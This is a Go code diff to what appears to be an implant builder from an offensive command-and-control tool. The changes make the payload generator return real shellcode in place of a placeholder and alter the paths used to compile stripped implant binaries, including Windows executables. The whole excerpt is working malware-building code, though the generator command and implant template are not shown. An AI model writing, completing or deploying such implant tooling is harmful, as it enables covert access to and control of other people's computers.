@@ -76,17 +76,15 @@ func generatePayload(opts *PayloadOptions) string {
 	generatorCmdArgs = strings.Replace(generatorCmdArgs, "<--port-->", opts.Lport, 1)
 	splitGeneratorCmdArgs := strings.Split(generatorCmdArgs, " ")
 
-	fmt.Println(generatorCmd, splitGeneratorCmdArgs)
-
 	genOut, err := exec.Command(generatorCmd, splitGeneratorCmdArgs...).Output()
 	if err != nil {
 		fmt.Println("Payload generation err:", err)
 	}
 
-	fmt.Println("[*] Payload generated")
-	fmt.Println(genOut)
+	payloadShellcode := string(genOut)
+	fmt.Printf("[*] Payload generated: %d bytes\n", len(payloadShellcode))
 
-	return "deadbeef"
+	return string(genOut)
 }
 
 // This will take a script template for an implant and inject the data required (shellcode, key etc)
@@ -182,7 +180,7 @@ func compileAndStoreImplant(opts *PayloadOptions) bool {
 		fileExt = ".exe"
 	}
 
-	_, err := exec.Command("go", "build", "-ldflags", "-s -w", "-o", "out/implant-"+targetOs+fileExt, "cmd/implant_gen/main.go").Output()
+	_, err := exec.Command("go", "build", "-ldflags", "-s -w", "-o", "out/implant-"+targetOs+fileExt, "data/generated_scripts/main.go").Output()
 	if err != nil {
 		fmt.Println("Compilation err:", err)
 	}
@@ -198,7 +196,7 @@ func compileAndStoreImplant(opts *PayloadOptions) bool {
 		log.Fatal("Error setting GOARCH env var back:", osEnvErr)
 	}
 
-	fmt.Printf("[*] Implant compiled and ready. Stored in 'out/implant-%s%s'\n", targetOs, fileExt)
+	fmt.Printf("[*] Implant compiled and ready. Stored in 'data/out/implant-%s%s'\n", targetOs, fileExt)
 	return true
 }
 
